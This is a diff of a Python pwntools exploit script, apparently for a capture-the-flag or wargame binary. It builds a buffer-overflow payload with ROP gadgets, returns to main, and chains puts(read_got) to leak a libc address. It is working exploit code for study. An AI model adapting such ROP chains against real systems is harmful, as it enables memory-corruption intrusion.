@@ -25,11 +25,16 @@ main = e.symbols['main']
 pop_rdi = 0x0000000000400883
 pop_rsi_r15 = 0x0000000000400881
 
-buf = b'A' * 0x40 # buf
-payload = buf + b'A' * 0x08 # buf + sfp
+buf = b'A' * 0x40  # buf
+payload = buf + b'B' * 0x08  # buf + sfp
+
+# ret2main (read_got 생성)
+p.send(payload + p64(main))
 
 # Exploit
-## puts(read_got)
+read_got = e.got['read']
+
+# puts(read_got)
 payload += p64(pop_rdi) + p64(read_got)
 payload += p64(puts_plt)
 payload += p64(main)
